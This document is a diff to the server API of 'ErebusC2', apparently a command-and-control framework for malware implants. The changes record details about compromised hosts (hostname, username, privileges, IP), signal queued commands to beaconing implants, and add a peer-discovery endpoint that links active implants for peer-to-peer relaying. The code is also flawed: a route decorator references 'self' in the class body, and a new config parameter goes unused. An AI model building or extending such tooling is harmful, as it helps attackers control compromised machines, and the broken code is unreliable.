@@ -85,11 +85,12 @@ except ImportError:
 class ServerAPI:
     """API server for ErebusC2"""
     
-    def __init__(self, config_path: str = "server/server_config.yaml"):
+    def __init__(self, config_path: Optional[str] = None, config_dict: Optional[Dict[str, Any]] = None):
         """Initialize the server API
         
         Args:
             config_path: Path to configuration file
+            config_dict: Configuration dictionary
         """
         self.logger = self._setup_logging()
         self.config = self._load_config(config_path)
@@ -121,6 +122,9 @@ class ServerAPI:
         
         # Event queue for pushing updates to connected clients
         self.event_queue = queue.Queue()
+        
+        # Initialize event handler list
+        self.event_handlers = []
         
         self.logger.info("Server API initialized")
     
@@ -653,17 +657,34 @@ class ServerAPI:
         """
         try:
             # Extract implant information
+            system_info = data.get("SystemInfo", {})
             implant_info = {
                 "id": implant_id,
-                "hostname": data.get("hostname"),
-                "os": data.get("os"),
-                "username": data.get("username"),
-                "ip": data.get("ip"),
+                "hostname": system_info.get("Hostname", "Unknown"),
+                "os": system_info.get("Platform", "Unknown"),
+                "username": system_info.get("Username", "Unknown"),
+                "architecture": system_info.get("Architecture", "Unknown"),
                 "protocol_id": protocol_id,
                 "registered": datetime.datetime.now().isoformat(),
                 "last_seen": datetime.datetime.now().isoformat(),
-                "status": "active"
+                "status": "active",
+                "privileges": system_info.get("Privileges", "user"),
+                "language": system_info.get("Language", "en_US")
             }
+            
+            # Add network information if available
+            if "network" in data:
+                implant_info["network"] = data["network"]
+                
+            # Extract IP address if available
+            try:
+                if "X-Forwarded-For" in request.headers:
+                    implant_info["ip"] = request.headers["X-Forwarded-For"].split(',')[0].strip()
+                else:
+                    implant_info["ip"] = request.remote_addr
+            except:
+                # Not in HTTP context
+                pass
             
             # Register implant
             self.peer_tracker.register(implant_id, "implant", implant_info)
@@ -703,6 +724,13 @@ class ServerAPI:
             if "network" in data:
                 status_update["network"] = data["network"]
                 
+            # Add peer status if available
+            if "Status" in data and "PeerStatus" in data["Status"]:
+                status_update["peer_status"] = data["Status"]["PeerStatus"]
+                if "connections" in data["Status"]["PeerStatus"]:
+                    # Store connected peer IDs for visualization
+                    status_update["peers"] = list(data["Status"]["PeerStatus"]["connections"].keys())
+                
             # Update implant in peer tracker
             self.peer_tracker.update_implant(implant_id, status_update)
             
@@ -737,7 +765,8 @@ class ServerAPI:
             self._queue_event({
                 "type": "implant_beacon",
                 "implant_id": implant_id,
-                "timestamp": time.time()
+                "timestamp": time.time(),
+                "has_commands": len(pending_commands) > 0
             })
             
         except Exception as e:
@@ -905,7 +934,85 @@ class ServerAPI:
         Args:
             event: Event data
         """
-        self.event_queue.put(event)
+        try:
+            # Add to event queue
+            self.event_queue.put(event)
+            
+            # Also call any registered event handlers
+            for handler in self.event_handlers:
+                try:
+                    handler(event)
+                except Exception as e:
+                    self.logger.error(f"Error in event handler: {e}")
+                    
+        except Exception as e:
+            self.logger.error(f"Error queuing event: {e}")
+    
+    def register_event_handler(self, handler: Callable[[Dict[str, Any]], None]):
+        """Register an event handler to receive all events
+        
+        Args:
+            handler: Handler function that takes an event dict
+        """
+        self.event_handlers.append(handler)
+        self.logger.debug("Event handler registered")
+    
+    @self.app.route('/p2p/discover', methods=['POST'])
+    def discover_peers():
+        if not authenticate():
+            return jsonify({"error": "Unauthorized"}), 401
+            
+        data = request.get_json()
+        
+        agent_id = data.get("AgentId")
+        network_data = data.get("NetworkData", {})
+        
+        if not agent_id:
+            return jsonify({"error": "Missing AgentId"}), 400
+        
+        # Find compatible peers for this implant
+        compatible_peers = []
+        all_implants = self.peer_tracker.get_implants()
+        
+        for implant in all_implants:
+            # Skip self
+            if implant["id"] == agent_id:
+                continue
+                
+            # Skip implants without network data
+            if "network" not in implant:
+                continue
+                
+            # Check if implant was active recently (last 10 minutes)
+            last_seen = implant.get("last_seen")
+            if last_seen:
+                try:
+                    last_seen_time = datetime.datetime.fromisoformat(last_seen)
+                    now = datetime.datetime.now()
+                    if (now - last_seen_time).total_seconds() > 600:  # 10 minutes
+                        # Skip inactive implants
+                        continue
+                except:
+                    pass
+            
+            # Add to potential peers list
+            compatible_peers.append({
+                "AgentId": implant["id"],
+                "NetworkData": implant.get("network", {})
+            })
+            
+            # Limit to reasonable number
+            if len(compatible_peers) >= 5:
+                break
+        
+        # Update this implant with network data
+        self.peer_tracker.update_implant(agent_id, {"network": network_data})
+        
+        # Return list of potential peers
+        return jsonify({
+            "Status": "Success",
+            "Peers": compatible_peers
+        })
 
 
 def create_server_api(config_path: Optional[str] = None):
